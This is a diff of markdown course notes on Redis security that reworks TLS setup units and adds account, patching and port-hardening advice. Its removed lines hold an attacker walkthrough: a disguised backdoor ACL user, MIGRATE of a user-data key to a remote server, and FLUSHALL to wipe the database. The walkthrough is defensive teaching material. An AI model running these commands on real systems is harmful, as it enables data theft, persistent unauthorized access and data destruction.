@@ -534,168 +534,114 @@ So by now you should know the different building blocks of TLS. Obviously, we've
 
 
 ### VI. [Encrypting Connections](https://youtu.be/5zO-DKDtG3Q)
-It's finally time to secure Redis with TLS.
-In this unit, we'll configure a Redis server process for TLS.
-And we'll connect over TLS using the Redis CLI.
-In the next unit, we'll look at some additional TLS
-settings, including mutual authentication.
-For TLS to work, we'll need to build Redis
-with encryption enabled.
-To do this, set the BUILD_TLS environment
-variable when you compile Redis, like you see here on screen.
-Now, we have Redis binaries with TLS enabled.
-To establish encryption, we need to create three files--
-the server certificate, which is the file containing
-the server's public key, which has been signed
-by a certificate authority, the issuing certificate, that is,
-the certificate used to sign the server's public key,
-and finally, the server's private key.
-In a production environment, the issuing certificate
-will usually be provided by whichever certificate
-authority you use.
-For example, it's common in many enterprises
-to operate an internal certificate authority
-to issue certificates.
-But for the purpose of this demo,
-we'll create our own issuing certificate.
-So we'll effectively be acting like our own certificate
-authority.
-Let's use the openssl utility to create these files.
-openssl is pretty complex.
-So I'm just going to give a high-level description
-of the commands you need to run here.
-For all the details, check out the handout and the openssl
-docs.
-First, we'll create the issuing certificate's private key.
-If you run this openssl command,
-you'll get a file called ca.key, which contains the private key.
-Then we'll use that private key to create
-the issuing certificate itself.
-So when we run this command, we provide
-the ca.key file to create the issuing certificate, which
-is stored in the ca.crt file.
-Now that we have the issuing certificate,
-we'll create our server certificate.
-The first step is creating a private key for the server.
-That's stored in the file redis.key.
-Then, we use this private key and the issuing certificate
-we just created to create the server certificate.
-So the server certificate is now in the file redis.crt.
-Let's move these files to some standard directories.
-We'll store our issuing certificate
-in /usr/local/share/ca-certificates.
-We'll store our private keys in /etc/ssl/private.
-And finally, we'll store the server certificate in /etc/ssl.
-On Ubuntu, you can tell the system about new certificates
-by running update-ca-certificates, which
-I'm doing here.
-We'll also need to set the correct permissions
-on these files.
-Private keys should be restricted to the owner
-with permissions 400.
-The public keys ending in .crt should have permissions 644.
-Now we have the files we need to set up Redis with TLS.
-So to begin, let's open up our redis.conf configuration file.
-First, we set the port value to 0.
-This is how we disable unencrypted clear text
-connections to Redis.
-This is an important step.
-Next, we set the TLS port to 6379.
-This means that Redis will require
-TLS when clients connect to it on the standard port.
-Now, we'll specify the server certificate
-file, which is redis.crt.
-And we also specify the server's private key file,
-which is redis.key.
-We also need to provide the issuing certificate
-authority files that this Redis server will trust.
-This is important for client authentication later on.
-We'll provide the file ca.crt from
+It's finally time to secure Redis with TLS. In this unit, we'll configure a Redis server process for TLS. And we'll connect over TLS using the Redis CLI. In the next unit, we'll look at some additional TLS settings, including mutual authentication. For TLS to work, we'll need to build Redis with encryption enabled. To do this, set the BUILD_TLS environment variable when you compile Redis, like you see here on screen. 
+
+Now, we have Redis binaries with TLS enabled. To establish encryption, we need to create three files-- the server certificate, which is the file containing the server's public key, which has been signed by a certificate authority, the issuing certificate, that is, the certificate used to sign the server's public key, and finally, the server's private key. In a production environment, the issuing certificate will usually be provided by whichever certificate authority you use.
+
+For example, it's common in many enterprises to operate an internal certificate authority to issue certificates. But for the purpose of this demo, we'll create our own issuing certificate. So we'll effectively be acting like our own certificate authority. Let's use the openssl utility to create these files. openssl is pretty complex. So I'm just going to give a high-level description of the commands you need to run here. For all the details, check out the handout and the openssl docs.
+
+First, we'll create the issuing certificate's private key. If you run this openssl command, you'll get a file called ca.key, which contains the private key. Then we'll use that private key to create the issuing certificate itself. So when we run this command, we provide the ca.key file to create the issuing certificate, which is stored in the ca.crt file. Now that we have the issuing certificate, we'll create our server certificate.
+
+The first step is creating a private key for the server. That's stored in the file redis.key. Then, we use this private key and the issuing certificate we just created to create the server certificate. So the server certificate is now in the file redis.crt. Let's move these files to some standard directories. We'll store our issuing certificate in /usr/local/share/ca-certificates. We'll store our private keys in /etc/ssl/private.
+
+And finally, we'll store the server certificate in /etc/ssl. On Ubuntu, you can tell the system about new certificates by running update-ca-certificates, which I'm doing here.
+
+We'll also need to set the correct permissions on these files. Private keys should be restricted to the owner with permissions 400. The public keys ending in .crt should have permissions 644. Now we have the files we need to set up Redis with TLS. So to begin, let's open up our redis.conf configuration file.
+
+First, we set the port value to 0. This is how we disable unencrypted clear text connections to Redis. This is an important step. Next, we set the TLS port to 6379.
+
+This means that Redis will require TLS when clients connect to it on the standard port. Now, we'll specify the server certificate file, which is redis.crt. And we also specify the server's private key file, which is redis.key. We also need to provide the issuing certificate authority files that this Redis server will trust. This is important for client authentication later on. We'll provide the file ca.crt from
+```
 /usr/local/share/ca-certificates.
-It's also possible to specify a directory of trusted issuing
-certificates, or root certificates.
-And you can see an example of that in the GitHub repo
-for this course.
-Now we're also going to disable client authentication for now.
-We'll see how to use client authentication
-in the next unit.
-Let's also specify a few reasonable TLS defaults.
-First, we'll specify that we only support TLS versions
-1.2 and 1.3.
-We'll also specify some allowed cipher suites.
-The tls-ciphers directive determines which cipher suites
-can be used when a client requests a TLS v1.2 connection.
-Similarly, the tls-ciphersuites directive determines which
-cipher suites are allowed for v1.3 connections.
-And finally, we;ll set tls-prefer-server-ciphers to no
-to indicate that the server should allow clients to choose
-the cipher suite for TLS connections.
-We can now start Redis so that it uses TLS.
-So first, we'll start a Redis server process
-and point it to the redis.conf we were just editing.
-Next, let's try connecting to the server using Redis CLI.
-And notice that the connection gets closed right away.
-If we look at the Redis log file, we'll see an SSL error.
-We actually need to tell the client
-that we're connecting over TLS.
-So here I am providing the --tls option.
-And I'm also providing a certificate authority file.
-In this case, this is the certificate that
-issued the server's public key.
-This is effectively telling the client
-that the server's certificate should be signed
-by this issuing certificate.
-Now when we connect, we can run commands.
-And we know that our connection is encrypted.
-So that's the basics of setting up encryption in Redis.
-in the next unit, we'll see how to enable
-TLS for Redis clusters, how to set up client authentication,
-and how to tweak some advanced TLS parameters.
+```
+
+It's also possible to specify a directory of trusted issuing certificates, or root certificates. And you can see an example of that in the GitHub repo for this course. Now we're also going to disable client authentication for now. We'll see how to use client authentication in the next unit. Let's also specify a few reasonable TLS defaults.
+
+First, we'll specify that we only support TLS versions 1.2 and 1.3. We'll also specify some allowed cipher suites. The tls-ciphers directive determines which cipher suites can be used when a client requests a TLS v1.2 connection. Similarly, the tls-ciphersuites directive determines which cipher suites are allowed for v1.3 connections. And finally, we;ll set tls-prefer-server-ciphers to no to indicate that the server should allow clients to choose the cipher suite for TLS connections. We can now start Redis so that it uses TLS. So first, we'll start a Redis server process and point it to the redis.conf we were just editing.
+
+Next, let's try connecting to the server using Redis CLI. And notice that the connection gets closed right away. If we look at the Redis log file, we'll see an SSL error. We actually need to tell the client that we're connecting over TLS. So here I am providing the --tls option. And I'm also providing a certificate authority file. In this case, this is the certificate that issued the server's public key. This is effectively telling the client that the server's certificate should be signed by this issuing certificate.
+
+Now when we connect, we can run commands. And we know that our connection is encrypted. So that's the basics of setting up encryption in Redis. in the next unit, we'll see how to enable TLS for Redis clusters, how to set up client authentication, and how to tweak some advanced TLS parameters.
 
 - [OpenSSL Command Line Utilities](https://wiki.openssl.org/index.php/Command_Line_Utilities)
 
 - [TLS Support in Redis 6 at redis.io](https://redis.io/topics/encryption)
 
 
-### VII. [An Attacker's Perspective](https://youtu.be/NmPv15JJm5Y)
-At this point, I'm sure you understand that the majority of Redis exploits are caused by administrators exposing Redis directly to the internet and by not enabling authentication. After all, you've heard our horror stories. 
+### VII. [TLS 1.3, Mutual Authentication and Advanced TLS Configuration](https://youtu.be/GArzb2MU-6s)
+In the last unit, we enabled TLS in Redis for the first time. There are just a few more ideas we need to cover to round out our discussion of TLS and Redis. these include enabling TLS for Redis replicas and clusters, enabling mutual authentication, and enforcing TLS version 1.3. Let's take the easy one first. It's important to keep in mind that it's not just the connection between our Redis clients and our Redis servers that we want to secure. We also want to ensure that the connections between our Redis servers are encrypted. This is important when running Redis with replication. That is, when you have a master node and one or more replicas. And it's also important when running an open source Redis cluster where you partition your data across many Redis instances.
 
-ACLs are important because they limit attack surface. But to limit attack surface, you need to understand a few post-exploitation techniques. Post-exploitation is what happens when an attacker has gained access to a system. This should get you thinking about exactly what you need to protect against. To do that, let's look at an attacker's perspective. Here's how I'd attack Redis if I were an attacker. 
+In general, this feature is known as internode encryption, and it's fully supported in open source Redis. If you open the Redis config file, you can scroll down to the TLS section to find the directive tls-replication. Just uncomment this, and make sure it's set to yes.
 
-First, I'd run the `SCAN` command to get a general sense of which keys exist.
-If I were a less-adept attacker, I might run the `KEYS` command, which returns every key on the Redis server. The problem with this command is that it might raise alarms. The `KEYS` command blocks until it completes. For this reason, KEYS is considered a dangerous command, so don't ever run it in production yourself. 
+This will ensure that Redis replicas connect to their master nodes using TLS. If you're running Redis cluster, you should also uncomment the tls-cluster directive and make sure it's set to yes. This will ensure that TLS cluster bus connections are also encrypted. Now let's take a look at client authentication. Without client authentication, anybody can connect to our servers.
 
-I might also run the `MONITOR` command -- another dangerous command. The `MONITOR` command streams every command sent to Redis back to your client. This would allow me to see in real time exactly what's sent to the server. Once I had some key names, I'd run the `TYPE` command. This would show me what commands I could run against the keys that I had access to. For instance, here I have a hash. So I can use the `HGETALL` command to see what's inside. 
-```
-TYPE secret:users:1
-HGETALL secret:users:1
-```
+Imagine, for instance, that an attacker somehow gains access to our network and tries to connect to Redis. If we've enabled client authentication, this won't be so easy. With client authentication enabled, clients must present a certificate that's been signed by a certificate authority that's trusted by our Redis server. If the client doesn't have a signed trusted certificate, then it won't ever be able to connect. Remember in the last unit when we created our own issuing certificate and stored it in /usr/local/share/ca-certificates? Let's use that issuing certificate now to create a client certificate. First, we create the client's key, which here gives us the file client.key.
 
-Look at all the sensitive data. I've just found someone's personal information. I've hit the jackpot. Before leaving though, I need to add one more thing -- a backdoor user using the ACL `SETUSER` command. 
-```
-ACL SETUSER applicationuser on >password +@all ~* 
-```
+Next, we use this key with some openssl commands to generate a client certificate. To do this, we need the issuing certificate, which is ca.crt. And we need the issuing certificate's private key, which is ca.key. Running these commands gives us client.crt, which is a certificate that's been signed by the issuing certificate that's trusted by our Redis server. Now, let's copy this certificate and private key to /etc/ssl/clients.
 
-This would allow me to log back in later and continue my work. In this case, I've named the user *applicationuser* and given this user all permissions. I'll even persist it to your ACL configuration file. This ambiguous naming might get past any cursory check of the currently allowed users. So this incidentally shows why it's important to regularly review the accounts in your database. This is the approach often used by a *low-and-slow* type of attacker. These attackers are the most dangerous because they're hard to detect. 
+Since our app will be the main user of this public and private key pair, we'll make the app user the owner of these files. We'll also set the appropriate permissions on them. So let's now enable client authentication. We'll open up the redis.conf file, and set the tls-auth-clients directive to yes. Next, we'll start the Redis server. Now when we connect to the server, we need to provide the certificate we just created when we start Redis CLI. We also need to specify the client cert and client key we just created. Now we connect. And if we can run the PING command, we know that we've successfully connected with mutual authentication. OK.
 
-Another type of attacker is the destructive one. As a destructive attacker, I do two things. If I thought your data was valuable, I'd use the `MIGRATE` command to send the data to my own Redis server. `MIGRATE` moves the entire key and removes it from its origin database. 
-```
-MIGRATE remoreredisserver.redis.cloud 7700 "" 0 5000 KEYS secret:users:1 
-```
+Lastly, let's talk about running TLS v1.3. In the previous unit, we configured our Redis server so that it would accept connections via TLS 1.2 or TLS 1.3. Both are acceptable, but TLS 1.3 is the newer standard. Compared to 1.2, TLS 1.3 makes fewer round trips on the initial handshake, and it enforces stronger cipher suites. So it's slightly faster, and it ensures that you're using the latest, greatest encryption algorithms.
 
-Here, I'm migrating the key secret:users:1 to my own server. I can save these details for a later targeted attack using this user's personal information. 
+As long as your application clients can handle TLS 1.3, you may as well configure your Redis server to exclusively use it. Here's how you do that. Open up redis.conf. Now set tls-protocols to "TLSv1.3". That is, you get rid of the TLSv1.2 part entirely. Then you restrict the TLS cipher suite to the ones you see here. And note that because we're restricting to TLS v 1.3, the tls-ciphers does not apply. And that's it.
 
-Now on the other hand, if the data on the system was not valuable to me, I'd just drop the database using the `FLUSHALL` command. Now if I run `KEYS`, the database no longer exists. Pretty scary, huh? That's why access controls like ACLs are so important. You can help stop the bad guys from getting in, and you can stop them from stealing data or destroying your database.
+That's all there is to setting up TLS in Redis. We encourage you to try setting this up all on your own. We've provided all of these commands and Docker files in the course git repository.
 
-|  |  |  |
-| ----------- | ----------- | ----------- |
-| [SCAN command](https://redis.io/commands/scan) | [KEYS command](https://redis.io/commands/keys) | [TYPE command](https://redis.io/commands/type) |
-| [MONITOR command](https://redis.io/docs/latest/commands/monitor/) | [HGETALL command](https://redis.io/commands/hgetall) | [MIGRATE command](https://redis.io/commands/migrate) |
-| [FLUSHALL command](https://redis.io/commands/flushall) | [ACL commands](https://redis.io/docs/latest/commands/?name=ACL) | [ACL GENPASS](https://redis.io/docs/latest/commands/acl-genpass/) |
-| [ACL USERS](https://redis.io/docs/latest/commands/acl-users/) | [ACL GETUSER](https://redis.io/docs/latest/commands/acl-getuser/) | [ACL DRYRUN](https://redis.io/docs/latest/commands/acl-dryrun/) |
+[OpenSSL Command Line Utilities](https://wiki.openssl.org/index.php/Command_Line_Utilities)
+
+[TLS Support in Redis 6 at redis.io](https://redis.io/topics/encryption)
 
 
-### VIII. Biblipgraphy 
+### VIII. Security Maintenance and Advanced Hardening
+Security Maintenance
+The code we base modern applications on is always changing, and this introduces new problems frequently. In the case of open-source projects like Redis, this code may be reviewed at any time, by anyone in the world. Security researchers frequently find new ways to attack old code.
+
+The security maintenance tasks you need to worry about when running Redis include account management and security patching for both clients and servers.
+
+Account Management
+As your Redis deployment ages, permissions and accounts are bound to become irrelevant. Part of account management is the continuous review of ACL users to ensure they have appropriate permissions and still require access to Redis.
+
+If these accounts are no longer needed or the permissions are no longer appropriate, then the accounts should be removed or their permissions should be modified. Implementing a process to continuously review your Redis ACL users will help you to meet compliance standards as you use Redis. Many organizations conduct reviews quarterly or bi-annually; however, it's best to follow your organization's policy.
+
+You should use the ACL LIST command to review your Redis ACL users and permissions as well as review your redis.conf file and external ACL file.
+
+Password Management
+If your organization requires regular password rotation, then there are several Redis passwords you should keep in mind.
+
+If Redis is deployed in standalone mode, consider:
+
+ACL user passwords
+
+AUTH passwords (required for backwards compatibility)
+
+If Redis is deployed in cluster mode:
+
+ACL user passwords
+	a.  This applies to the master user for replica to master interactions
+	b.  This applies to the sentinel user
+	c.  This applies to all ACL users
+AUTH passwords
+	a.  This may apply to sentinel, client to server, or replica to master interactions (MasterAUTH)
+Software Maintenance
+Redis continuously receives code modifications, some of which may contain security updates. Because the impact to your deployment may vary depending on the update, it's best to ensure that you are always on the latest stable version of Redis.
+
+You can check what Redis version you are on using the INFO command. At the top of the output will be the Redis version that you are on. You can compare this to the latest stable version that you can find on the Redis downloads website at:
+
+https://redis.io/download
+
+The Redis client of your choice should be kept up to date for the same reasons, and how to upgrade and check your client will be different depending on the client that you use. There is one other important consideration for your client. Because Redis clients are maintained by a broad community of open-source maintainers, it's important that when selecting a client you ensure that the client is actively maintained.
+
+To check for clients that are actively maintained you can visit https://redis.io/clients. You can find a large list of clients to choose from on this site. Recommended clients for each language marked with a gold star, these clients are generally well maintained and safe to use.
+
+Changing the Redis Port
+The default Redis port is 6379. This well known port is frequently the target of automated attacks. Unless you are targeted by a motivated attacker directly, modifying the Redis port can be a way to ensure that scripts run against systems searching for vulnerabilities do not target you.
+
+Changing the Redis port is as simple as modifying the port or tls-port directive in the redis.conf file.
+
+Changing the default port is not supported at runtime using the CONFIG command.
+
+
+### IX. Biblipgraphy 
 1. [WinShark](https://www.wireshark.org/#homeMemberLink)
 2. [Npcap](https://npcap.com/)
 3. [Hexdump for Windows](https://www.di-mgt.com.au/hexdump-for-windows.html#downloads)
@@ -716,4 +662,4 @@ Now on the other hand, if the data on the system was not valuable to me, I'd jus
 ```
 
 
-### EOF (2024/06/21)
+### EOF (2024/06/28)
